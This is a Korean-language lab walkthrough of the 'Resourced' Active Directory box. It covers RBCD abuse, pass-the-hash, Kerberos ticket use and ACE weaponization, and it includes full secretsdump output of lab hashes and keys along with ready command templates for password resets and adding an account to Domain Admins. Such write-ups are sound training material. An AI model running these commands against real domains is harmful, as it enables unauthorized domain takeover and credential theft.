G.GOLDBERG@RESOURCED.LOCAL     | pwdneverexpires=false
R.ROBINSON@RESOURCED.LOCAL     | pwdneverexpires=false
D.DURANT@RESOURCED.LOCAL       | pwdneverexpires=false
P.PARKER@RESOURCED.LOCAL       | pwdneverexpires=false
V.VENTZ@RESOURCED.LOCAL        | pwdneverexpires=true      ← 통과
S.SWANSON@RESOURCED.LOCAL      | pwdneverexpires=false
J.JOHNSON@RESOURCED.LOCAL      | pwdneverexpires=false
L.LIVINGSTONE@RESOURCED.LOCAL  | pwdneverexpires=true      ← 통과
K.KEEN@RESOURCED.LOCAL         | pwdneverexpires=false
M.MASON@RESOURCED.LOCAL        | pwdneverexpires=false
```

**`DONT_EXPIRE_PASSWORD`(userAccountControl 비트 0x10000)가 켜진 계정 정확히 둘만 인증에 성공했다.** 2021-10-01에 설정된 비밀번호들이 기본 최대 사용 기간(42일)을 한참 넘겼기 때문이다. 인과가 정확히 맞아떨어진다.

> [!tip] 일반화 — 해시 다발을 얻으면 «만료되지 않은 계정»부터 노려라
> 도메인 해시를 통째로 얻었는데 대부분 `PASSWORD_EXPIRED`가 뜨면, 그건 막다른 길이 아니라 **후보가 좁혀진 것**이다.
> LDAP에서 미리 확인할 수 있다:
> ```bash
> # userAccountControl 에 DONT_EXPIRE_PASSWORD(65536) 비트가 켜진 계정
> ldapsearch -x -H ldap://<IP> -D '<user>@<domain>' -w '<pass>' -b '<baseDN>' \
>   '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))' sAMAccountName
> ```
> `1.2.840.113556.1.4.803` 은 **LDAP_MATCHING_RULE_BIT_AND** 다 — 비트 AND 매칭 OID. 이 OID를 모르면 UAC 플래그 필터를 손으로 못 쓴다. **외워 둘 값이다.**
> 같은 정보를 nxc 모듈로도 얻는다: `nxc ldap <IP> -u .. -p .. --password-not-required`, `--admin-count`, `--trusted-for-delegation`.

### 2-5. `GenericAll` on «컴퓨터 객체» → 왜 RBCD 인가

BloodHound가 찾아낸 ACE는 이것 하나다. JSON에서 직접 확인한다:

```bash
$ jq -r '.data[] | .Properties.name as $n | .Aces[]? |
         "\($n) <= \(.PrincipalSID) \(.PrincipalType) \(.RightName) inherited=\(.IsInherited)"' \
    20260703143203_computers.json
RESOURCEDC.RESOURCED.LOCAL <= S-1-5-21-...-512  Group Owns              inherited=false   # Domain Admins
RESOURCEDC.RESOURCED.LOCAL <= S-1-5-21-...-512  Group GenericAll        inherited=false
RESOURCEDC.RESOURCED.LOCAL <= S-1-5-21-...-1105 User  GenericAll        inherited=false   ← ★ L.Livingstone
RESOURCEDC.RESOURCED.LOCAL <= S-1-5-21-...-526  Group AddKeyCredentialLink inherited=true
RESOURCEDC.RESOURCED.LOCAL <= S-1-5-21-...-527  Group AddKeyCredentialLink inherited=true
RESOURCEDC.RESOURCED.LOCAL <= S-1-5-21-...-519  Group GenericAll        inherited=true    # Enterprise Admins
RESOURCEDC.RESOURCED.LOCAL <= ...-S-1-5-32-544  Group GenericWrite/WriteOwner/WriteDacl inherited=true
```

**RID 1105 = `L.Livingstone`** 이고, 이 ACE는 **`inherited=false`** — 즉 **누군가 손으로 붙여 놓은 것**이다. 상속된 것이 아니므로 오설정이 명백하다.

> [!note] `GenericAll` 이 사용자 객체에 붙었을 때와 «컴퓨터» 객체에 붙었을 때는 무기화가 다르다
> | 대상 | `GenericAll` 로 할 수 있는 것 | 대표 기법 |
> |---|---|---|
> | **사용자 객체** | 비밀번호 강제 리셋(`net rpc password`, `bloodyAD set password`) | 가장 단순. 다만 **원래 비밀번호가 날아가 탐지되기 쉽다** |
> | **그룹 객체** | 자신을 멤버로 추가 | `net rpc group addmem` |
> | **컴퓨터 객체** | ① `msDS-AllowedToActOnBehalfOfOtherIdentity` 쓰기 ⇒ **RBCD**<br>② `msDS-KeyCredentialLink` 쓰기 ⇒ **Shadow Credentials** | **RBCD가 이 박스의 경로** |
>
> 컴퓨터 객체의 비밀번호를 리셋할 수도 있지만, **DC의 머신계정 비밀번호를 바꾸면 도메인이 깨진다.** 실전에서도 시험에서도 하면 안 되는 짓이다. 그래서 컴퓨터 객체에서는 **위임 속성을 건드리는 쪽**이 정석이다.

### 2-6. RBCD의 메커니즘 — S4U2Self 와 S4U2Proxy

**Resource-Based Constrained Delegation**은 "**누가 나에게 위임할 수 있는가**를 **자원 쪽이** 정한다"는 모델이다(Windows Server 2012+). 그 결정이 자원 객체의 속성 하나에 담긴다:

- **`msDS-AllowedToActOnBehalfOfOtherIdentity`** — 값은 **보안 서술자(SDDL)** 다. 여기 적힌 주체는 "자원(=RESOURCEDC)에 대해 아무 사용자나 사칭해 접근"할 수 있다.

우리가 그 속성에 **우리가 만든 머신계정 `4Leaf$`** 를 써넣으면, `4Leaf$`는 DC에 대해 **Administrator를 사칭**할 수 있게 된다. 사칭은 Kerberos 확장 둘로 이뤄진다:

| 단계 | 확장 | 무슨 일이 일어나는가 |
|---|---|---|
| ① | **S4U2Self** (`Service for User to Self`) | `4Leaf$`가 KDC에 "**Administrator가 나(4Leaf$)에게 접근하는 것처럼** 된 서비스 티켓을 달라"고 요청. **비밀번호 없이** Administrator 이름이 박힌 티켓을 얻는다. 다만 이 티켓은 `4Leaf$` 자신에게만 유효하다 |
| ② | **S4U2Proxy** (`Constrained Delegation`) | ①에서 받은 티켓을 증거로 붙여 "**이 사용자를 대신해** `cifs/resourcedc.resourced.local` 티켓을 달라"고 요청. KDC는 RESOURCEDC의 `msDS-AllowedToActOnBehalfOfOtherIdentity`에 `4Leaf$`가 있는지 확인하고 **발급한다** |

`impacket-getST -impersonate` 한 번이 ①②를 연달아 수행한다. 결과물은 **CIFS 서비스 티켓** — TGT가 아니다. Kali에 남은 ccache가 그것을 증명한다(§4-5).

> [!danger] S4U2Proxy가 성립하려면 ①의 티켓이 **forwardable** 이어야 한다
> `impacket-getST --help` 원문(실측):
> > `-impersonate ... (thru ... allowed for delegation to the SPN specified ... be forwardable. For best results, the -hashes and -aesKey values for the specified -identity should be ...)`
>
> **Protected Users 그룹 멤버나 "Account is sensitive and cannot be delegated"(UAC 0x100000)가 켜진 계정은 사칭할 수 없다** — S4U2Self가 non-forwardable 티켓을 주기 때문이다. 시험에서 Administrator 사칭이 실패하면 **가장 먼저 이걸 의심하라.** 그때는 사칭 대상을 다른 도메인 관리자로 바꾼다.
> 이 박스의 Administrator는 보호돼 있지 않았다 — 발급된 티켓의 플래그에 `forwardable`이 찍혀 있다(§4-5).

### 2-7. 전제조건 — `MachineAccountQuota`

RBCD를 걸려면 **우리가 통제하는, 비밀번호를 아는 SPN 보유 주체**가 필요하다. 가장 쉬운 방법이 머신계정을 새로 만드는 것이고, 그것을 허용하는 것이 도메인 속성 `ms-DS-MachineAccountQuota` 다.

- AD 스키마의 **기본값은 10** 이다 — 즉 **인증된 사용자면 누구나** 머신계정을 10개까지 만들 수 있다.
- **[가정]** 이 박스의 실제 MAQ 값은 확인하지 못했다. BloodHound LEGACY 덤프의 `domains.json`은 `machineaccountquota` 속성을 **수집하지 않는다**(속성 키 목록에 없음 — `description`/`distinguishedname`/`domain`/`domainsid`/`functionallevel`/`highvalue`/`name`/`whencreated` 뿐). 다만 **`L.Livingstone`(비관리자)로 `addcomputer`가 성공했다는 사실 자체가 MAQ > 0 의 운영상 증거**다.
- 미리 확인하는 법(실측 — nxc 모듈 목록에 등재돼 있다): `nxc ldap <IP> -u .. -p .. -M maq`

> [!warning] MAQ가 0이면 RBCD가 막힌다 — 그때의 대안
> 1. **이미 존재하는 머신계정**의 자격증명을 확보한다(예: `$MACHINE.ACC` 해시 — 우리는 이 박스에서 이미 갖고 있었다: `9ddb6f4d9d01fedeb4bccfb09df1b39d`)
> 2. **Shadow Credentials** 로 방향을 튼다 — `msDS-KeyCredentialLink`에 인증서 공개키를 심고 PKINIT으로 TGT를 받는다. `GenericAll`이면 이 속성도 쓸 수 있다. (단 **ADCS가 필요**하다 — 이 박스에는 없었으므로 실행하지 않았다)
> 3. 컴퓨터 객체가 아니라 **다른 경로**를 찾는다

### 2-8. 이 박스는 NTLM과 Kerberos를 «둘 다» 쓴다 — 어디서 갈리는가

Resourced의 공격 사슬은 **전반부가 NTLM, 후반부가 Kerberos**다. 두 프로토콜의 차이를 모르면 "해시가 있는데 왜 어떤 건 되고 어떤 건 안 되나"를 영원히 이해하지 못한다.

| 단계 | 프로토콜 | 무엇으로 인증했나 |
|---|---|---|
| §1-2 익명 사용자 열거 | **SMB / 널 세션** | 아무것도 (익명) |
| §1-3~1-4 `V.Ventz` 공유 접근 | **NTLM** | 평문 비밀번호 |
| §4-1 해시 검증 | **NTLM** | **NT 해시** (PtH) |
| §4-2 evil-winrm | **NTLM over HTTP** | **NT 해시** (PtH) |
| §4-4 addcomputer / rbcd | **NTLM over SMB(SAMR) / LDAP** | **NT 해시** (PtH) |
| §4-4③ getST (S4U) | **Kerberos** | `4Leaf$` 평문 비밀번호 |
| §4-6 psexec | **Kerberos** | **ccache의 서비스 티켓** |

#### NTLM — 3단 챌린지-응답, 그리고 NT 해시가 «키»가 되는 지점

```
클라이언트                                              서버
    │  ① NEGOTIATE_MESSAGE   (지원 기능 목록)          │
    ├──────────────────────────────────────────────────►│
    │  ② CHALLENGE_MESSAGE   (서버 논스 «챌린지» 8바이트)│
    │◄──────────────────────────────────────────────────┤
    │  ③ AUTHENTICATE_MESSAGE (NTLMv2 응답)            │
    ├──────────────────────────────────────────────────►│
```

③에서 클라이언트가 계산하는 값은 이렇다:

```
NTOWFv2  = HMAC-MD5( NT해시, UTF-16LE( UPPER(사용자명) + 도메인 ) )
NTv2Resp = HMAC-MD5( NTOWFv2, 서버챌린지 ‖ blob )      # blob = 타임스탬프·클라이언트논스·타깃정보
```

> [!danger] **평문 비밀번호가 이 식 어디에도 들어가지 않는다** — 그래서 PtH가 성립한다
> 계산의 출발점은 **NT 해시 그 자체**다. 즉 NTLM에서 **NT 해시는 «비밀번호의 지문»이 아니라 «비밀번호를 대체하는 키»** 다.
> 그래서 `evil-winrm -H`, `nxc -H`, `impacket -hashes :NTHASH` 가 전부 동작한다. **크랙할 필요가 없다.**
> 반대로 이 성질 때문에 **NT 해시 유출은 비밀번호 유출과 동등**하다. "해시라서 안전하다"는 말은 NTLM 앞에서 성립하지 않는다.

**LM 자리를 왜 비우는가** — impacket의 `-hashes LMHASH:NTHASH` 에서 `:19a3…` 처럼 **콜론으로 시작**하는 것은 LM 해시를 빈 값으로 두라는 뜻이다. LM 해시는 Windows Vista/Server 2008 이후 기본적으로 저장되지 않으며(§3 덤프의 LM 자리가 전부 `aad3b435b51404eeaad3b435b51404ee` — **«빈 LM 해시»의 고정값**이다), NTLMv2 계산에도 쓰이지 않는다. **저 33자리 상수를 보면 "LM 없음"으로 읽어라.**

**SMB 서명이 막는 것은 PtH가 아니라 «릴레이»다** — §1-1의 `Message signing enabled and required` 는 우리가 해시로 인증하는 것을 막지 못했다(§4-1이 증명한다). 서명이 막는 것은 **제3자가 ③의 AUTHENTICATE_MESSAGE를 가로채 다른 서버에 되던지는 것**이다. **PtH와 NTLM 릴레이를 혼동하지 마라 — 서명 강제 도메인에서도 PtH는 그대로 된다.**

#### Kerberos — 티켓 유통과 ccache

```
클라이언트                                   KDC(=DC)                       서비스
   │ ① AS-REQ (사전인증: 타임스탬프를 «사용자 키»로 암호화)  │                  │
   ├──────────────────────────────────────────►│                              │
   │ ② AS-REP (TGT + 세션키)                    │                              │
   │◄──────────────────────────────────────────┤                              │
   │ ③ TGS-REQ (TGT 제시 + 원하는 SPN)          │                              │
   ├──────────────────────────────────────────►│                              │
   │ ④ TGS-REP (서비스 티켓 = «서비스 키»로 암호화)│                             │
   │◄──────────────────────────────────────────┤                              │
   │ ⑤ AP-REQ (서비스 티켓 제시)                                                │
   ├──────────────────────────────────────────────────────────────────────────►│
```

**이 박스에서 `getST -impersonate` 가 한 일은 ③④를 S4U 확장 형태로 수행한 것**이고(§2-6), 결과인 ④의 서비스 티켓만 ccache에 저장했다. **①②(TGT 획득)는 아예 일어나지 않았다** — §4-5에서 캐시에 자격증명이 1개뿐인 이유다.

> [!note] `KRB5CCNAME` 과 ccache — Linux 측 Kerberos의 «전부»
> **ccache(credential cache)** 는 MIT Kerberos가 티켓을 담아 두는 파일이고, 그 경로를 알려주는 것이 환경변수 **`KRB5CCNAME`** 이다. impacket·evil-winrm·nxc의 `-k` 는 **전부 이 변수를 본다.**
> ```bash
> export KRB5CCNAME=/절대/경로/티켓.ccache   # ← 반드시 «절대 경로»
> klist                                      # 무엇이 들어 있는지 확인. 이걸 건너뛰지 마라
> ```
> - `getST.py`·`getTGT.py` 는 **현재 디렉터리에** `<주체>@<SPN>@<REALM>.ccache` 를 만든다 → **파일을 옮기면 상대 경로 export가 깨진다**(§6 참조)
> - `FILE:` 접두사는 붙여도 되고 안 붙여도 된다. `klist -c` 출력에는 `FILE:` 이 붙어 나온다
> - **`kinit` 으로 만든 캐시와 impacket이 만든 캐시는 호환된다** — 형식이 같기 때문에 `klist`로 둘 다 읽힌다
>
> **`-k` 와 `-no-pass` 의 정확한 의미**(impacket `--help` 실측):
> | 플래그 | 원문 | 실제 동작 |
> |---|---|---|
> | `-k` | *"Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) **based on target parameters**."* | **명령행의 타겟 문자열로 SPN을 조립해** 캐시에서 찾는다. **IP를 주면 `cifs/<IP>` 를 찾다가 실패한다** |
> | `-no-pass` | *"don't ask for password (useful for -k)"* | 비밀번호 프롬프트를 띄우지 않는다. 없으면 **입력 대기에서 멈춘다** |
>
> **"based on target parameters"** 이 한 구절이 §4-6의 `/etc/hosts` 작업 전체의 이유다.

> [!tip] 해시를 얻었을 때 «NTLM이 막혔다면» Kerberos로 우회할 수 있다
> 도메인이 NTLM을 비활성화했거나 서명·채널 바인딩으로 막았을 때:
> ```bash
> impacket-getTGT 'domain/user' -hashes :<NTHASH>      # RC4 사전인증 → TGT (OverPass-the-Hash)
> impacket-getTGT 'domain/user' -aesKey <AES256KEY>    # RC4가 꺼진 도메인이면 이쪽
> export KRB5CCNAME=$(realpath 'user.ccache')
> impacket-psexec -k -no-pass <FQDN>
> ```
> **§3에서 뽑아 둔 `aes256-cts-hmac-sha1-96` 값이 바로 이 자리에 쓰인다.** 해시 덤프에서 AES 키를 버리지 마라.

### 2-9. ACE 무기화 지도 — 이 박스의 DACL에 실제로 있던 «전부»

§2-5에서 인용한 `computers.json` 덤프에는 **여섯 종류의 ACE**가 나온다. 정답 경로는 `GenericAll` 하나였지만, **나머지도 전부 무기화 가능한 것들**이고 시험에서는 그 중 아무거나 나온다. 이 표가 BloodHound 엣지를 보는 사전이다.

| 이 박스에 실제로 있던 ACE | 누가 갖고 있었나 | 컴퓨터 객체에서의 무기화 | 도구 |
|---|---|---|---|
| **`GenericAll`** | **`L.Livingstone`(RID 1105)** · Domain Admins · Enterprise Admins | **모든 속성 쓰기** ⇒ RBCD · Shadow Credentials · (사용자 객체라면) 비밀번호 리셋 | `impacket-rbcd` · `pywhisker` |
| `GenericWrite` | Builtin\Administrators (상속) | **대부분의 속성 쓰기.** `GenericAll` 없이도 **RBCD·Shadow Credentials 둘 다 된다** — 필요한 것은 속성 «쓰기»뿐이기 때문 | 동일 |
| `WriteDacl` | Builtin\Administrators (상속) | **DACL 자체를 고쳐 자신에게 `GenericAll` 을 부여**한다. 한 단계 우회 | `impacket-dacledit` · `bloodyAD add genericAll` |
| `WriteOwner` | Builtin\Administrators (상속) | **소유자를 자신으로 바꾼다.** 소유자는 언제나 DACL을 고칠 수 있으므로 → `WriteDacl` → `GenericAll` | `impacket-owneredit` |
| `Owns` | Domain Admins | 이미 소유자다. `WriteOwner`의 종착점 | — |
| **`AddKeyCredentialLink`** | RID **526**(Key Admins) · **527**(Enterprise Key Admins), 둘 다 **상속됨** | **`msDS-KeyCredentialLink` 에 인증서 공개키를 심고 PKINIT으로 TGT 획득** = Shadow Credentials | `pywhisker` · `certipy shadow auto` |

> [!tip] 네 개(`GenericAll`·`GenericWrite`·`WriteDacl`·`WriteOwner`)는 **사실상 같은 것**이다
> `WriteOwner` → `WriteDacl` → `GenericAll` → `GenericWrite` 로 **한 방향으로 승격된다.** 그러므로 **넷 중 하나라도 보이면 컴퓨터 객체는 이미 우리 것**이다.
> BloodHound가 이들을 별개 엣지로 그리는 것은 «몇 단계를 더 밟아야 하는가»를 보여주기 위함이지, **막혔다는 뜻이 아니다.**
> **반사**: 컴퓨터 객체에 이 넷 중 하나 → **RBCD 를 먼저 시도**(ADCS 불필요) → 막히면 **Shadow Credentials**(ADCS 필요).

> [!warning] `AddKeyCredentialLink` 가 **상속으로 두 그룹에 걸려 있다** — 이 박스에서는 쓸 수 없었다
> `Key Admins`(RID 526)·`Enterprise Key Admins`(527)는 **AD 기본 그룹**이고, 이 ACE도 `inherited=true` 다 — **오설정이 아니라 정상 구성**이다.
> 우리가 쓸 수 없었던 이유는 두 가지다: ① `L.Livingstone`이 그 그룹의 멤버가 아니고, ② **이 도메인에 ADCS(인증 기관)가 없어** PKINIT 경로 자체가 성립하지 않는다.
> **일반화**: BloodHound에 엣지가 보인다고 «내가» 쓸 수 있는 것이 아니다. **엣지의 «주체»가 내가 통제하는 계정인지 반드시 확인하라.** `inherited=true` 인 ACE는 대개 기본 구성이고, **`inherited=false` 인 ACE가 오설정**이다 — 이 박스에서 정답이었던 `L.Livingstone` 의 `GenericAll` 이 정확히 `inherited=false` 였다.

> [!note] 사용자·그룹 객체에 붙었을 때는 무기화가 달라진다 — 시험에서 더 흔한 쪽
> | ACE | **사용자** 객체 | **그룹** 객체 |
> |---|---|---|
> | `GenericAll` | 비밀번호 강제 리셋 · Shadow Credentials · 대상이 SPN을 갖도록 만들어 **Targeted Kerberoast** | 자신을 멤버로 추가 |
> | `ForceChangePassword` | **비밀번호 리셋만** 가능 | — |
> | `AddMember` | — | 자신을 멤버로 추가 |
> | `WriteSPN` | `servicePrincipalName` 을 써넣고 **Kerberoast** → 오프라인 크랙 | — |
>
> ```bash
> # 사용자 비밀번호 강제 리셋 (수동 대안 포함)
> net rpc password 'TARGET' 'NewPass123!' -U 'DOMAIN/attacker%pass' -S <DC>
> bloodyAD --host <DC> -d <domain> -u <u> -p <p> set password 'TARGET' 'NewPass123!'
> # 그룹에 자신 추가
> net rpc group addmem 'Domain Admins' 'attacker' -U 'DOMAIN/attacker%pass' -S <DC>
> bloodyAD --host <DC> -d <domain> -u <u> -p <p> add groupMember 'Domain Admins' 'attacker'
> ```
> **주의: 비밀번호 리셋은 «되돌릴 수 없다».** 실전에서는 계정 소유자가 즉시 알아채고, 시험에서도 그 계정으로 다른 것을 하려면 곤란해진다. **가능하면 리셋이 아닌 경로를 먼저 찾아라** — 이 박스가 RBCD를 택한 이유이기도 하다.

---

## 3. Foothold — 오프라인 `secretsdump`

```bash
┌──(kali㉿kali)-[~/PG/Resourced/registry]
└─$ impacket-secretsdump -system SYSTEM -security SECURITY local -ntds ntds.dit
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
[*] DPAPI_SYSTEM
dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
[*] NL$KM
 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.>.J......I.
 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673
[*] Cleaning up...
```
![[Pasted image 20260703134859.png]]

**출력에서 반드시 읽을 것**

| 줄 | 의미 |
|---|---|
| `Target system bootKey: 0x6f96…` | `SYSTEM` 하이브에서 SysKey 추출 성공. **여기서 실패하면 하이브가 잘못된 것** |
| `PEK # 0 found and decrypted` | bootKey로 PEK를 깠다. **이 줄이 없으면 뒤의 해시는 전부 쓰레기** |
| `RESOURCEDC$:1000:...:9ddb6f4d…` | 머신계정 NT 해시가 **`$MACHINE.ACC`와 동일**하다 — 같은 비밀의 다른 저장소이므로 일치하는 것이 정상이다. **자기 검증 지점**으로 써라 |
| `aes256-cts-hmac-sha1-96` | Kerberos 키. **NT 해시보다 이쪽이 유용한 경우가 있다** — `-aesKey`로 인증하면 RC4 티켓을 요구하지 않아 탐지를 피하고, RC4가 정책으로 꺼진 도메인에서도 동작한다 |
| `Guest:501:…:31d6cfe0d16ae931b73c59d7e0c089c0` | **빈 비밀번호의 NT 해시**다. 이 값은 외워 둬라 — 보이면 "비밀번호 없음"이다 |

해시만 뽑아 파일로 정리했다(`hashs.txt`, 14행 — NT 해시만):

```bash
# hashes 원본에서 추출
cut -d: -f1 hashes.txt > users.txt      # 사용자명
cut -d: -f4 hashes.txt > nt.txt         # NT 해시 (4번째 필드)
```

> [!warning] 위 두 줄의 결과 파일명과 실제 남은 파일명이 다르다
> Kali에 실제로 남은 것은 `users.txt`와 **`hashs.txt`**(오타 포함)이며, 뒤의 nxc 명령도 `-H hashs.txt`를 쓴다. `nt.txt`는 남아 있지 않다. **원본 노트의 이 스니펫은 «요령의 기록»이지 그대로 실행된 명령이 아니다.** 실제 `hashs.txt` 내용은 NT 해시 14줄이다.

---

## 4. 권한상승

### 4-1. 해시 다발을 «짝지어» 검증 — `--no-bruteforce` 의 정확한 의미

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ nxc smb 192.168.125.175 -u users.txt -H hashs.txt --no-bruteforce --continue-on-success
SMB         192.168.125.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\RESOURCEDC:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\krbtgt:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\M.Mason:3105e0f6af52aba8e11d19f27e487e45 STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\K.Keen:204410cc5a7147cd52a04ddae6754b0c STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\J.Johnson:3e028552b946cc4f282b72879f63b726 STATUS_PASSWORD_EXPIRED
